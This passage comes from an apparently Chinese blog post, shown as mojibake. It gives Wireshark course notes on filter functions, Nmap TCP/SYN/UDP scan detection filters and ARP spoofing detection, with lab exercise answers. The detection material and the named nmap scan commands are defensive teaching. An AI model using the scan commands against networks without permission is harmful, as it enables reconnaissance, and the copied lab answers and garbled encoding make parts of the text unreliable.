<td>ç¨æ³</td>
<td><code>tcp.port in {80 443 8080}</code></td>
</tr>
</tbody>
</table>
<p><img src="https://i-blog.csdnimg.cn/img_convert/8b9447d0b8958386eab7006f9cafac9c.png" alt="600" loading="lazy"></p>
<h5 id="ç­éæ¡ä»¶å¤§å">ç­éæ¡ä»¶ï¼âå¤§åâ</h5>
<table>
<thead>
<tr>
<th>ç­é</th>
<th><strong>å¤§å</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>ç±»å</td>
<td>åè½</td>
</tr>
<tr>
<td>æè¿°</td>
<td>å°å­ç¬¦ä¸²å¼è½¬æ¢ä¸ºå¤§åã</td>
</tr>
<tr>
<td>ä¾å­</td>
<td>æ¥æ¾ææâAPACHEâæå¡å¨ã</td>
</tr>
<tr>
<td>å·¥ä½æµç¨</td>
<td>å°ææ  HTTP æ°æ®åçâserverâå­æ®µè½¬æ¢ä¸ºå¤§åï¼å¹¶ååºåå«âAPACHEâå³é®å­çæ°æ®åã</td>
</tr>
<tr>
<td>ç¨æ³</td>
<td><code>upper(http.server) contains "APACHE"</code></td>
</tr>
<tr>
<td><img src="https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081237720-700087188.png" alt="600" loading="lazy"></td>
<td></td>
</tr>
</tbody>
</table>
<h4 id="ç­éæ¡ä»¶å°å">ç­éæ¡ä»¶ï¼âå°åâ</h4>
<table>
<thead>
<tr>
<th>ç­é</th>
<th><strong>å°å</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>ç±»å</td>
<td>åè½</td>
</tr>
<tr>
<td>æè¿°</td>
<td>å°å­ç¬¦ä¸²å¼è½¬æ¢ä¸ºå°åã</td>
</tr>
<tr>
<td>ä¾å­</td>
<td>æ¥æ¾ææâ apache âæå¡å¨ã</td>
</tr>
<tr>
<td>å·¥ä½æµç¨</td>
<td>å°ææ  HTTP æ°æ®åçâserverâå­æ®µä¿¡æ¯è½¬æ¢ä¸ºå°åï¼å¹¶ååºåå«â apache âå³é®å­çæ°æ®åã</td>
</tr>
<tr>
<td><strong>ç¨æ³</strong></td>
<td><code>lower(http.server) contains "apache"</code></td>
</tr>
</tbody>
</table>
<p><img src="https://i-blog.csdnimg.cn/img_convert/80510b742b8d628c36450ba815cc9328.png" alt="600" loading="lazy"></p>
<h5 id="ç­éæ¡ä»¶è½¬å­ç¬¦ä¸²å¹é">ç­éæ¡ä»¶ï¼âè½¬å­ç¬¦ä¸²å¹éâ</h5>
<table>
<thead>
<tr>
<th>ç­é</th>
<th><strong>è½¬å­ç¬¦ä¸²å¹é</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>ç±»å</td>
<td>åè½</td>
</tr>
<tr>
<td>æè¿°</td>
<td>å°éå­ç¬¦ä¸²å¼è½¬æ¢ä¸ºå­ç¬¦ä¸²ã</td>
</tr>
<tr>
<td>ä¾å­</td>
<td>æ¾åºæææ°å­ä¸ºå¥æ°çå¸§ã</td>
</tr>
<tr>
<td>å·¥ä½æµç¨</td>
<td>å°ææâå¸§ç¼å·âå­æ®µè½¬æ¢ä¸ºå­ç¬¦ä¸²å¼ï¼å¹¶å°å¸§åè¡¨ä»¥å¥æ°å¼ç»å°¾ã</td>
</tr>
<tr>
<td>ç¨æ³</td>
<td><code>string(frame.number) matches "[13579]$"</code></td>
</tr>
<tr>
<td><img src="https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081236695-1149699087.png" alt="600" loading="lazy"></td>
<td></td>
</tr>
</tbody>
</table>
<h5 id="ä¹¦ç­¾åç­éæé®">ä¹¦ç­¾åç­éæé®</h5>
<p>æä»¬å·²ç»ä»ç»äºåç§ç­ééé¡¹ãè¿ç®ç¬¦åå½æ°ãç°å¨æ¯æ¶ååå»ºç­éå¨å¹¶å°å¶ä¿å­ä¸ºä¹¦ç­¾åæé®ï¼ä»¥ä¾¿æ¥åä½¿ç¨ãå¦åæè¿°ï¼ç­éå·¥å·æ æä¸ä¸ªç­éä¹¦ç­¾é¨åï¼ç¨äºä¿å­ç¨æ·åå»ºçç­éå¨ï¼è¿æå©äºåæå¸åªéç¹å»å ä¸å³å¯éå¤ä½¿ç¨å¸¸ç¨æå¤æçç­éå¨ãä¸ä¹¦ç­¾ç±»ä¼¼ï¼æ¨ä¹å¯ä»¥åå»ºç­éæé®ï¼åªéåå»ä¸ä¸å³å¯åºç¨ã</p>
<p>åå»ºåä½¿ç¨ä¹¦ç­¾ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/cf16a852caa84b422fd905318186b501.png" alt="600" loading="lazy"></p>
<p>åå»ºåä½¿ç¨æ¾ç¤ºç­éæé®ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/65434fd5a964a3c38289f0f2846f4948.png" alt="700" loading="lazy"></p>
<h5 id="ç®ä»">ç®ä»</h5>
<p>Wireshark æ¯ä¸æ¬¾å¤åè½å·¥å·ï¼å¯å¸®å©åæäººåè¿è¡æ·±å¥çæ°æ®ååæãæ­£å¦æä»¬å¨è®¨è®ºä¸­æå°çï¼åæç¹å®äºä»¶éè¦éç½®å¤ä¸ªåå¥½è®¾ç½®ãå¦ææ¯æ¬¡è°æ¥é½éè¦éæ°æ´æ¹éç½®ï¼è¿éå¸¸ç¹çï¼å ä¸ºæ¯ä¸ªæ¡ä¾é½éè¦ä¸åçé¢è²è§ååè¿æ»¤æé®ãè¿æ¶ï¼Wireshark éç½®æä»¶å°±æ´¾ä¸äºç¨åºãæ¨å¯ä»¥ä¸ºä¸åçè°æ¥æ¡ä¾åå»ºå¤ä¸ªéç½®æä»¶ï¼å¹¶æ ¹æ®éè¦ä½¿ç¨å®ä»¬ãæ¨å¯ä»¥ä½¿ç¨ <strong>âç¼è¾ --&gt; éç½®éç½®æä»¶â</strong> èåæ <strong>âç¶ææ å³ä¸è§ --&gt; éç½®æä»¶â</strong> é¨åæ¥åå»ºãä¿®æ¹åæ´æ¹éç½®æä»¶ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/2913d40aa10878cc6ec62a3d4550a411.png" alt="700" loading="lazy"></p>
<p>è¯·åç­ä»¥ä¸é®é¢</p>
<p>æ¥æ¾ææ Microsoft IIS æå¡å¨ãæå¤å°ä¸ªæ°æ®åå¹¶éæºèªâç«¯å£ 80âï¼<br>
ç­éï¼<code>http.server contains "IIS" &amp;&amp; tcp.srcport != 80</code></p>
<pre><code class="language-python">21
</code></pre>
<p>æ¥æ¾ææ Microsoft IIS æå¡å¨ãçæ¬å·ä¸ºâ7.5âçæ°æ®åæ°éæ¯å¤å°ï¼<br>
ç­éï¼<code>http.server contains "IIS" &amp;&amp; http.server contains "7.5"</code></p>
<pre><code class="language-python">71
</code></pre>
<p>ä½¿ç¨ç«¯å£ 3333ã4444 æ 9999 çæ°æ®åæ»æ°æ¯å¤å°ï¼<br>
è¿éé¢ç®æ²¡æè¯´æ¸æ¥æ¯tcpåè®®<br>
ç­éï¼<code>tcp.port in  {3333 4444 9999}</code></p>
<pre><code class="language-python">2235
</code></pre>
<p>TTL å¼ä¸ºå¶æ°çåæå¤å°ä¸ªï¼<br>
ç¨æ­£åå¹éå¶æ°ï¼åæéè¦å°ttlè½¬ä¸ºstring<br>
å¹éæ¨¡å¼æ¯ï¼ä»¥0248ç»å°¾çå°±æ¯å¶æ°äº<br>
ç­éï¼<code>string(ip.ttl) matches "[02468]$"</code></p>
<pre><code class="language-python">77289
</code></pre>
<p>å°éç½®æä»¶æ´æ¹ä¸ºâæ ¡éªåæ§å¶âãâéè¯¯ç TCP æ ¡éªåâæ°æ®å æå¤å°ä¸ªï¼<br>
éæ©ä¸ä¸è¯¥éç½®ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/ed4f28bfbc79576afbf0189e1eaaa90f.png" alt="" loading="lazy"><br>
ç¶åç¼è¾ä»ï¼ä¿®æ¹ä¸ºï¼<code>éè¯¯ç TCP æ ¡éª</code><br>
<img src="https://i-blog.csdnimg.cn/img_convert/7a63472aa16654742ac66d8e312371cb.png" alt="" loading="lazy"><br>
ç­éï¼<code>tcp.checksum.status == 0</code></p>
<pre><code class="language-python">34185
</code></pre>
<p>ä½¿ç¨ç°æçè¿æ»¤æé®è¿æ»¤æµéãæ¾ç¤ºçåæ°éæ¯å¤å°ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/952fa8c9c1c79e91dea6e40aead984e4.png" alt="" loading="lazy"></p>
<pre><code class="language-python">261
</code></pre>
<h3 id="wiresharkæµéåæ">Wiresharkï¼æµéåæ</h3>
<p>æä»¬å°æ·±å¥åæå¹¶å³èæ°æ®åçº§ä¿¡æ¯ï¼ä»èäºè§£ç½ç»æµéçå¨è²ï¼ä¾å¦æ£æµå¼å¸¸åæ¶ææ´»å¨ãå¯¹äºå®å¨åæå¸èè¨ï¼è¿ç¨èªèº«ç¥è¯åå·¥å·åè½æ¥æ¦æªå¹¶çè§£æ°æ®åä¸­æ£å¸çä¿¡æ¯è³å³éè¦ãæ¬èè¯¾å°è®²è§£å¦ä½ç»ååæå¸ç¥è¯å Wireshark çåè½ï¼éå¯¹ç¹å®æ¡ä¾ï¼åææ°æ®åçº§ç»èï¼ä»èæ£æµå¼å¸¸åå¼å¸¸æåµã</p>
<h4 id="nmapæ«æ">Nmapæ«æ</h4>
<p>Nmapæ¯ä¸æ¬¾ä¸çæ åçç½ç»æ å°å·¥å·ï¼ç¨äºè¯å«æ´»å¨ä¸»æºåæå¡ãä½ä¸ºæå¸¸ç¨çç½ç»æ«æå·¥å·ä¹ä¸ï¼å®å¨åæå¸åºè¯å«å¶çæçç½ç»æ¨¡å¼ãæ¬èå°ä»ç»æå¸¸è§çNmapæ«æç±»åã</p>
<ul>
<li>TCPè¿æ¥æ«æ</li>
<li>SYNæ«æ</li>
<li>UDPæ«æ</li>
</ul>
<p>äºè§£Nmapæ«æçå·¥ä½åçå¯¹äºåç°ç½ç»ä¸çæ«ææ´»å¨è³å³éè¦ãç¶èï¼å¦æä¸ä½¿ç¨æ­£ç¡®çè¿æ»¤å¨ï¼å°±æ æ³çè§£æ«æçè¯¦ç»ä¿¡æ¯ãä»¥ä¸æ¯ç¨äºæ¢æµç½ç»ä¸ Nmapæ«æè¡ä¸ºçåºæ¬è¿æ»¤å¨ã</p>
<p><strong>TCPæ å¿ç®è¿°ï¼</strong></p>
<table>
<thead>
<tr>
<th><strong>ç¬è®°</strong></th>
<th><strong>Wireshark è¿æ»¤å¨</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>å¨å±æç´¢ã</td>
<td>- <code>tcp</code><br><br>- <code>udp</code></td>
</tr>
<tr>
<td>- ä» SYN æ å¿ã<br>- SYN æ å¿ä½å·²ç½®ä½ãå¶ä½ä½å¹¶ä¸éè¦ã</td>
<td>- <code>tcp.flags == 2</code><br><br>- <code>tcp.flags.syn == 1</code></td>
</tr>
<tr>
<td>- ä» ACK æ å¿ã<br>- ACK æ å¿ä½å·²ç½®ä½ãå¶ä½ä½å¹¶ä¸éè¦ã</td>
<td>- <code>tcp.flags == 16</code><br><br>- <code>tcp.flags.ack == 1</code></td>
</tr>
<tr>
<td>- ä» SYNãACK æ å¿ã<br>- SYN å ACK å·²ç½®ä½ãå¶ä½ä½å¹¶ä¸éè¦ã</td>
<td>- <code>tcp.flags == 18</code><br><br>- <code>(tcp.flags.syn == 1) and (tcp.flags.ack == 1)</code></td>
</tr>
<tr>
<td>- ä»RSTæ å¿ã<br>- RSTæ å¿ä½å·²ç½®ä½ãå¶ä½ä½å¹¶ä¸éè¦ã</td>
<td>- <code>tcp.flags == 4</code><br><br>- <code>tcp.flags.reset == 1</code></td>
</tr>
<tr>
<td>- ä»åå« RST å ACK æ å¿ã<br>- RST å ACK ä½å·²ç½®ä½ãå¶ä½ä½å¹¶ä¸éè¦ã</td>
<td>- <code>tcp.flags == 20</code><br><br>- <code>(tcp.flags.reset == 1) and (tcp.flags.ack == 1)</code></td>
</tr>
<tr>
<td>- ä» FIN æ å¿<br>- FIN æ å¿å·²ç½®ä½ãå¶ä½ä½å¹¶ä¸éè¦ã</td>
<td>- <code>tcp.flags == 1</code><br><br>- <code>tcp.flags.fin == 1</code></td>
</tr>
</tbody>
</table>
<h5 id="tcpè¿æ¥æ«æ">TCPè¿æ¥æ«æ</h5>
<p><strong>TCPè¿æ¥æ«æç®è¿°ï¼</strong></p>
<ul>
<li>ä¾èµäºä¸æ¬¡æ¡æï¼éè¦å®ææ¡æè¿ç¨ï¼ã</li>
<li>éå¸¸ä»¥<code>nmap -sT</code> å½ä»¤å½¢å¼æ§è¡ã</li>
<li>ä¾éç¹æç¨æ·ä½¿ç¨ï¼é root ç¨æ·çå¯ä¸éé¡¹ï¼ã</li>
<li>ç±äºåè®®çç¹æ§ï¼è¯·æ±éå¸¸éè¦ä¸äºæ°æ®ï¼å æ­¤çªå£å¤§å°éå¸¸å¤§äº 1024 å­èã</li>
</ul>
<table>
<thead>
<tr>
<th><strong>æå¼ TCP ç«¯å£</strong></th>
<th><strong>æå¼ TCP ç«¯å£  <br></strong></th>
<th><strong>TCPç«¯å£å·²å³é­</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>- åæ­¥ --&gt;<br>- &lt;-- SYNï¼ACK<br>- ACK --&gt;</td>
<td>- åæ­¥ --&gt;<br>- &lt;-- SYNï¼ACK<br>- ACK --&gt;<br>- RSTï¼ACK --&gt;</td>
<td>- åæ­¥ --&gt;<br>- &lt;-- RSTï¼ACK</td>
</tr>
</tbody>
</table>
<p>ä¸å¾å±ç¤ºäºTCPç«¯å£æå¼åå³é­çä¸æ¬¡æ¡æè¿ç¨ãä¸ºäºä¾¿äºè°æ¥åçè§£æ¯ä¸ªæ¡ä¾çç»èï¼å¾çåpcapæ ·æ¬å·²è¢«åå²ã</p>
<p><strong>æå¼ TCP ç«¯å£ï¼è¿æ¥ï¼ï¼</strong><br>
<img src="https://i-blog.csdnimg.cn/img_convert/ddaf7e10988b5ca085771fcad0520794.png" alt="" loading="lazy"><br>
<strong>TCPç«¯å£å·²å³é­ï¼è¿æ¥ï¼ï¼</strong><br>
<img src="https://i-blog.csdnimg.cn/img_convert/8a7acad1feb90d1efb4a6e03ac9e5cad.png" alt="" loading="lazy"></p>
<p>ä»¥ä¸å¾åå±ç¤ºäºå­¤ç«æµéä¸­çæ¨¡å¼ãç¶èï¼å¨å¤§åæè·æä»¶ä¸­åç°è¿äºæ¨¡å¼å¹¶éæäºãå æ­¤ï¼åæäººåéè¦ä½¿ç¨éç¨è¿æ»¤å¨æ¥æ¥çåå§å¼å¸¸æ¨¡å¼ï¼ç¶åæ´å®¹æå°æ³¨æåéä¸­å¨ç¹å®çæµéç¹ä¸ãç»å®çè¿æ»¤å¨æ¾ç¤ºäºæè·æä»¶ä¸­ç TCP è¿æ¥æ«ææ¨¡å¼ã<br>
<code>tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size &gt; 1024</code><br>
<img src="https://i-blog.csdnimg.cn/img_convert/de786e52afce642b5563aa63bad90ba9.png" alt="" loading="lazy"></p>
<h5 id="åæ­¥æ«æ">åæ­¥æ«æ</h5>
<p><strong>TCP SYN æ«æç®è¿°ï¼</strong></p>
<ul>
<li>ä¸ä¾èµäºä¸æ¬¡æ¡æï¼æ éå®ææ¡æè¿ç¨ï¼ã</li>
<li>éå¸¸ä»¥ <code>nmap -sS</code> å½ä»¤å½¢å¼æ§è¡ã</li>
<li>ä»ä¾ç¹æç¨æ·ä½¿ç¨ã</li>
<li>éå¸¸å¤§å°å°äºæç­äº 1024 å­èï¼å ä¸ºè¯·æ±å°æªå®æï¼å¹¶ä¸é¢è®¡ä¸ä¼æ¶å°æ°æ®ã</li>
</ul>
<table>
<thead>
<tr>
<th><strong>æå¼ TCP ç«¯å£</strong></th>
<th><strong>å³é­ TCP ç«¯å£</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>- åæ­¥ --&gt;<br>- &lt;-- åæ­¥ï¼ç¡®è®¤<br>- RST--&gt;</td>
<td>- åæ­¥ --&gt;<br>- &lt;-- RST,ACK</td>
</tr>
</tbody>
</table>
<p><strong>æå¼ TCP ç«¯å£ï¼SYNï¼ï¼</strong><br>
<img src="https://i-blog.csdnimg.cn/img_convert/b722c8882c43aaba29b1e8ec9ceb2c47.png" alt="" loading="lazy"><br>
<strong>TCPç«¯å£å·²å³é­ï¼SYNï¼ï¼</strong><br>
<img src="https://i-blog.csdnimg.cn/img_convert/c7a7a4f33ee331da26071c5b5907c507.png" alt="" loading="lazy"><br>
ç»å®çè¿æ»¤å¨æ¾ç¤º  æè·æä»¶ä¸­çTCP SYN æ«ææ¨¡å¼ã<br>
<code>tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size &lt;= 1024</code><br>
<img src="https://i-blog.csdnimg.cn/img_convert/81758a02fa43ed3d4f2a8c6660cd7ff0.png" alt="" loading="lazy"></p>
<h5 id="udpæ«æ">UDPæ«æ</h5>
<p><strong>UDPæ«æç®è¿°ï¼</strong></p>
<ul>
<li>ä¸éè¦æ¡æè¿ç¨</li>
<li>æ²¡ææå¼ç«¯å£çæç¤º</li>
<li>ç«¯å£å³é­ç ICMP éè¯¯æ¶æ¯</li>
<li>éå¸¸ä»¥ <code>nmap -sU</code> å½ä»¤å½¢å¼æ§è¡ã</li>
</ul>
<table>
<thead>
<tr>
<th><strong>æå¼UDPç«¯å£</strong></th>
<th><strong>UDPç«¯å£</strong>å·²<strong>å³é­</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>- UDPæ°æ®å --&gt;</td>
<td>- UDPæ°æ®å --&gt;<br>- ICMP ç±»å 3ï¼ä»£ç  3 æ¶æ¯ãï¼ç®æ ä¸å¯è¾¾ï¼ç«¯å£ä¸å¯è¾¾ï¼</td>
</tr>
</tbody>
</table>
<p><strong>å·²å³é­ï¼ç«¯å£ 69ï¼åå·²å¼æ¾ï¼ç«¯å£ 68ï¼ç UDPç«¯å£ï¼</strong><br>
<img src="https://i-blog.csdnimg.cn/img_convert/c17ab70b7afd212bb125a71b2f384f01.png" alt="" loading="lazy"><br>
ä¸å¾æ¾ç¤ºï¼å³é­çç«¯å£è¿åäºä¸ä¸ª ICMP éè¯¯æ°æ®åãä¹ä¸çï¼å¹¶æ²¡ææä¾å³äºè¯¥éè¯¯çæ´å¤ä¿¡æ¯ï¼é£ä¹åæäººåå¦ä½ç¡®å®æ­¤éè¯¯æ¶æ¯çå½å±å¢ï¼ICMP éè¯¯æ¶æ¯ä½¿ç¨åå§è¯·æ±ä½ä¸ºå°è£æ°æ®æ¥æ¾ç¤ºæ°æ®åçæ¥æº/åå ãå±å¼æ°æ®åè¯¦ç»ä¿¡æ¯çªæ ¼ä¸­ç ICMP é¨ååï¼æ¨å°çå°å°è£æ°æ®ååå§è¯·æ±ï¼å¦ä¸å¾æç¤ºã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/7bc1c2b5f17187270131b678a1f7a04d.gif" alt="" loading="lazy"><br>
ç»å®çè¿æ»¤å¨æ¾ç¤ºæè·æä»¶ä¸­çUDPæ«ææ¨¡å¼ã<br>
<code>icmp.type==3 and icmp.code==3</code><br>
<img src="https://i-blog.csdnimg.cn/img_convert/0f3b03bd69ab84a1c3e241202f63bcac.png" alt="" loading="lazy"><br>
æ£æµååæä»¶ä¸­çå¯çæ´»å¨å¾å®¹æï¼ä¹æ¯å­¦ä¹ å¦ä½å³æ³¨ç»èçå¥½æ¹æ³ã</p>
<hr>
<p><strong>ç°å¨ï¼è¯·ä½¿ç¨è¯¥<code>"~/Desktop/exercise-pcaps/nmap/Exercise.pcapng"</code>æä»¶ï¼å°æ¨çæè½åºç¨äºåä¸ªæè·æä»¶ï¼å¹¶åç­ä»¥ä¸é®é¢ï¼</strong></p>
<p>TCP è¿æ¥æ«æçæ»æ¬¡æ°æ¯å¤å°ï¼<br>
ç­éï¼<code>tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size &gt; 1024</code></p>
<pre><code class="language-python">1000
</code></pre>
<p>æ«æ TCP ç«¯å£ 80 ä½¿ç¨çæ¯åªç§æ«æç±»åï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/1c96318c0fe1f4603f4e1b8059a1a14d.png" alt="500" loading="lazy"></p>
<pre><code class="language-python">TCP Connect
</code></pre>
<p>æå¤å°æ¡âUDP å³é­ç«¯å£âæ¶æ¯ï¼<br>
ç­éï¼<code>icmp.type == 3 and icmp.code == 3</code></p>
<pre><code class="language-python">1083
</code></pre>
<p>55-70ç«¯å£èå´åçåªä¸ªUDPç«¯å£æ¯å¼æ¾çï¼<br>
ç­éï¼<code>udp.port in {55..70}</code><br>
æ³¨æï¼è¿éæ¥ççæ¯ç«¯å£å¼æ¾ï¼çä»ç®çå°ç«¯å£ï¼ç¶åè¿æ¥æåçï¼èä¸æ¯çä¸ªæ°åï¼å«æéäº<br>
<img src="https://i-blog.csdnimg.cn/img_convert/777826512c79ff412bd1704622705c28.png" alt="" loading="lazy"></p>
<pre><code class="language-python">68
</code></pre>
<h4 id="arpææ¯æ»å»åä¸­é´äººæ»å»">ARPææ¯æ»å»åä¸­é´äººæ»å»ï¼</h4>
<h5 id="arpæ¬ºéªä¸­åæ»å»åç§°ä¸­é´äººæ»å»">ARPæ¬ºéª/ä¸­åæ»å»ï¼åç§°ä¸­é´äººæ»å»ï¼</h5>
<p>ARPåè®®ï¼å³å°åè§£æåè®®ï¼<strong>ARP</strong>ï¼ï¼æ¯è´è´£åè®¸è®¾å¤å¨ç½ç»ä¸­è¯å«èªèº«èº«ä»½çææ¯ãå°åè§£æåè®®ææ¯ï¼ä¹ç§°ä¸ºARPæ¬ºéªæä¸­é´äººæ»å»ï¼MITMï¼ï¼æ¯ä¸ç§æ»å»ï¼å®éè¿åé»è®¤ç½å³åéæ¶æARPæ°æ®åæ¥å¹²æ°/æçºµç½ç»ãå¶æç»ç®çæ¯ç¯¡æ¹<strong>âIPå°åå°MACå°åè¡¨â</strong>ï¼å¹¶åæ¢ç®æ ä¸»æºçç½ç»æµéã</p>
<p>æå¾å¤å·¥å·å¯ç¨äºåèµ·ARPæ»å»ãç¶èï¼è¿ç§æ»å»çæè·¯æ¯åºå®çï¼å æ­¤åªè¦äºè§£ARPåè®®çå·¥ä½æµç¨åWiresharkçä½¿ç¨æå·§ï¼å°±å¾å®¹ææ£æµå°æ­¤ç±»æ»å»ã</p>
<p><strong>ARPåæç®è¿°ï¼</strong></p>
<ul>
<li>å¨æ¬å°ç½ç»ä¸è¿è¡</li>
<li>å®ç° MAC å°åä¹é´çéä¿¡</li>
<li>è¿ä¸æ¯ä¸ä¸ªå®å¨çåè®®</li>
<li>ä¸æ¯å¯è·¯ç±åè®®</li>
<li>å®æ²¡æèº«ä»½éªè¯åè½</li>
<li>å¸¸è§æ¨¡å¼æè¯·æ±ä¸ååºãå¬åååè´¹æ°æ®åã</li>
</ul>
<p>å¨è°æ¥æµéä¹åï¼æä»¬åæ¥çä¸äºåæ³åå¯ççARPæ°æ®åãåæ³çè¯·æ±ç±»ä¼¼äºå¾ä¸­æç¤ºï¼ä¸ä¸ªå¹¿æ­è¯·æ±ï¼è¯¢é®æ¯å¦æå¯ç¨ä¸»æºä½¿ç¨æä¸ªIPå°åï¼ä»¥åæ¥èªä½¿ç¨è¯¥IPå°åçä¸»æºçåå¤ã</p>
<table>
<thead>
<tr>
<th><strong>ç¬è®°</strong></th>
<th><strong>Wiresharkè¿æ»¤å¨</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>å¨çæç´¢</td>
<td>- <code>arp</code></td>
</tr>
<tr>
<td><strong>â ARP âéé¡¹ï¼ç¨äºè·åå¾æå¯å¾çææï¼</strong><br><br>- æä½ç  1ï¼ARPè¯·æ±ã<br>- æä½ç  2ï¼ARPååºã<br>- <strong>äº¨ç¹ï¼</strong>ARPæ«æ<br>- <strong>è°æ¥ï¼</strong>å¯è½æ£æµå°ARPä¸­æ¯<br>- <strong>æå¯»ï¼</strong>å¯è½æ£æµå°ARPæ³æ´ªæ»å»ï¼</td>
<td>- <code>arp.opcode == 1</code><br><br>- <code>arp.opcode == 2</code><br><br>- <code>arp.dst.hw_mac==00:00:00:00:00:00</code><br><br>- <code>arp.duplicate-address-detected or arp.duplicate-address-frame</code><br><br>- <code>((arp) &amp;&amp; (arp.opcode == 1)) &amp;&amp; (arp.src.hw_mac == target-mac-address)</code></td>
</tr>
</tbody>
</table>
<p><strong>ARPè¯·æ±</strong><br>
<img src="https://i-blog.csdnimg.cn/img_convert/a695c22f30fbaefe71dbb258905471d1.png" alt="" loading="lazy"></p>
<p><strong>ARPåºç­</strong><br>
<img src="https://i-blog.csdnimg.cn/img_convert/d138429f8549a8b09cfb79bbecc14bb1.png" alt="" loading="lazy"><br>
å¯çæåµæ¯æéå¯¹ç¹å® IP å°ååºç°ä¸¤ä¸ªä¸åçARPååºï¼å²çªï¼ãå¨è¿ç§æåµä¸ï¼Wireshark çä¸å®¶ä¿¡æ¯éé¡¹å¡ä¼ååæäººåååºè­¦åãä½æ¯ï¼å®åªä¼æ¾ç¤ºéå¤å¼çç¬¬äºä¸ªå®ä¾ä»¥çªåºæ¾ç¤ºå²çªãå æ­¤ï¼å¦ä½ä»åæ³æ°æ®åä¸­è¯å«æ¶ææ°æ®åæ¯åæäººåé¢ä¸´çææãä¸å¾å±ç¤ºäºä¸ä¸ªå¯è½ç IP å°åæ¬ºéªæ¡ä¾ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/a0419ddb616495622b5c7552affe61f3.png" alt="" loading="lazy"><br>
äºè§£ç½ç»æ¶æå¹¶æ£æ¥ç¹å®æ¶é´æ®µåçæµéæå©äºåç°å¼å¸¸ãä½ä¸ºåæå¸ï¼æ¨åºè¯¥å¨ç»§ç»­ä¸ä¸æ­¥ä¹åè®°å½ä¸æ¨çåç°ãè¿å°æå©äºæ¨ä¿ææ¡çæ¸æ°ï¼å¹¶ä¾¿äºå³èåç»­åç°ãè¯·çä¸å¾ï¼è¿éå­å¨å²çªï¼ä»¥âb4âç»å°¾çMACå°åæé äºä¸ä¸ªARPè¯·æ±ï¼å¶IPå°åä¸ºâ192.168.1.25âï¼ç¶åå£°ç§°èªå·±æ¥æâ192.168.1.1âçIPå°åã</p>
<table>
<thead>
<tr>
<th><strong>ç¬è®°</strong></th>
<th><strong>æ£æµè®°å½</strong></th>
<th><strong>åç°</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>å¯è½å­å¨å¹éç IP å°åã</td>
<td>1. éè¿ MAC å°åå¬å¸ç IP å°åã</td>
<td>- MACå°åï¼00:0c:29:e2:18:b4<br>- IPå°åï¼192.168.1.25</td>
</tr>
<tr>
<td>å¯è½æ¯ARPæ¬ºéªæ»å»ã</td>
<td>ä¸¤ä¸ª MAC å°åå£°ç§°æ¥æåä¸ä¸ª IP å°å (192.168.1.1)ãIP  <br>å°åâ192.168.1.1âå¯è½æ¯ä¸ä¸ªç½å³å°åã</td>
<td>- MAC1: 50:78:b3:f3ð¿f4<br>- MAC 2: 00:0c:29:e2:18:b4</td>
</tr>
<tr>
<td>å¯è½æ¯ARPæ³æ´ªæ»å»ã</td>
<td>ä»¥âb4âç»å°¾ç MAC å°åå£°ç§°æ¥æä¸åç/æ°ç IP å°åã</td>
<td>- MACå°åï¼00:0c:29:e2:18:b4<br>- IPå°åï¼192.168.1.1</td>
</tr>
</tbody>
</table>
<p>æä»¬ç»§ç»­æ£æ¥æµéï¼ä»¥åç°ä»»ä½å¶ä»å¼å¸¸æåµãè¯·æ³¨æï¼ä¸ºäºä¾¿äºè°æ¥ï¼æ­¤æ¡ä¾å·²æåä¸ºå¤ä¸ªæè·æä»¶ã</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/5c7d9efdace2212e118166d98822e057.png" alt="" loading="lazy"><br>
æ­¤æ¶ï¼å¼å¸¸æåµæ¾èæè§ãå®å¨åæå¸ä¸è½å¿½è§å¤§éçARPè¯·æ±ãè¿å¯è½æ¯æ¶ææ´»å¨ãæ«ææç½ç»é®é¢ãç°å¨åºç°äºä¸ä¸ªæ°çå¼å¸¸ï¼MAC å°åä»¥âb4âç»å°¾ï¼å¹¶å IP å°åâ192.168.1.25âåéäºå¤ä¸ªARPè¯·æ±ãè®©æä»¬éä¸­ç²¾åè¿½è¸ªè¿ä¸å¼å¸¸çæ¥æºï¼å¹¶è¡¥åä¹åçè®°å½ã</p>
<table>
<thead>
<tr>
<th><strong>ç¬è®°</strong></th>
<th><strong>æ£æµè®°å½</strong></th>
<th><strong>åç°</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>å¯è½å­å¨å¹éç IP å°åã</td>
<td>1. éè¿ MAC å°åå¬å¸ç IP å°åã</td>
<td>- MACå°åï¼00:0c:29:e2:18:b4<br>- IPå°åï¼192.168.1.25</td>
</tr>
<tr>
<td>å¯è½æ¯ARPæ¬ºéªæ»å»ã</td>
<td>2 ä¸ª MAC å°åå£°ç§°æ¥æåä¸ä¸ª IP å°å (192.168.1.1)ã<br><br>IP å°åâ192.168.1.1âå¯è½æ¯ä¸ä¸ªç½å³å°åã</td>
<td>- MAC1: 50:78:b3:f3ð¿f4<br>- MAC 2: 00:0c:29:e2:18:b4</td>
</tr>
<tr>
<td>å¯è½æ¯ARPæ¬ºéªæ»å»ã</td>
<td>ä»¥âb4âç»å°¾ç MAC å°åå£°ç§°æ¥æä¸åç/æ°ç IP å°åã</td>
<td>- MACå°åï¼00:0c:29:e2:18:b4<br>- IPå°åï¼192.168.1.1</td>
</tr>
<tr>
<td>å¯è½æ¯ARPæ³æ´ªæ»å»ã</td>
